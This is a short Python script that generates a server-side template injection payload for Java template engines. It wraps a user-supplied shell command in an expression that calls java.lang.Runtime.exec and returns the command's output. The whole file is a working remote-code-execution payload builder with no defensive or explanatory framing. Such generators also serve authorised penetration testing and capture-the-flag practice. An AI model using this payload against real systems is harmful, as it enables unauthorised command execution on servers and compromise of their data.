#!/usr/bin/python3

#This script for generator for SSTI of Java 


import sys

arg = sys.argv[1]

command = "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(\'{cmd}\').getInputStream())}"

command = command.replace("{cmd}",arg)

print(command)
